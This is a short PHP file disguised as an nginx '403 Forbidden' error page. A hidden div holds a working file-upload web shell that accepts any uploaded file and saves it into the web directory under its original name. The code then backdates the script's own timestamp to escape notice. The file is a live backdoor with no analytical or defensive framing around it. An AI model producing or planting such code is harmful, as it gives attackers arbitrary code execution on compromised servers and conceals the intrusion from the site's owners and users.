<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
</head>
<body>

<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
<div style="display: none;">
<?php
print "<h1>LOAD</h1>\n";
echo "Your IP: ";
echo $_SERVER['REMOTE_ADDR'];
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
echo "<input type=\"file\" name=\"filename\"><br> \n";
echo "<input type=\"submit\" value=\"LOAD\"><br>\n";
echo "</form>\n";
if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
	{
	move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
	$file = $_FILES["filename"]["name"];
	echo "<a href=\"$file\">$file</a>";
	} else {
	echo("NO FILE");
	}
$filename = $_SERVER[SCRIPT_FILENAME];
$time = time() - 100103600;
touch($filename, $time);
?>
<div>
</body>
</html>